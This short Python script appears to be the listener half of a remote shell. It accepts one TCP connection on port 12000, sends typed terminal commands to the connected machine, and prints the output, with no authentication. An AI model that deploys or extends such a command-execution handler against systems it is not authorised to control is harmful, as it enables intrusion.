from socket import *
import sys 
import struct
import json
from ast import literal_eval

PORT_NUMBER = 12000

# https://stackoverflow.com/questions/17667903/python-socket-receive-large-amount-of-data

def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

if __name__ == "__main__":
    hostName = gethostbyname( '0.0.0.0' )
    serverSocket = socket(AF_INET, SOCK_STREAM)
    serverSocket.bind(('0.0.0.0', PORT_NUMBER))
    serverSocket.listen(1)
    (connectionSocket, (ip, port)) = serverSocket.accept()
    while (1):
        command = input("Enter Terminal Command: $")
        command = str(command)
        send_msg(connectionSocket, command.encode('utf-8'))
        data = recv_msg(connectionSocket)   
        # print(data)
        try:    
            print(data.decode())
        except:
            print("error")

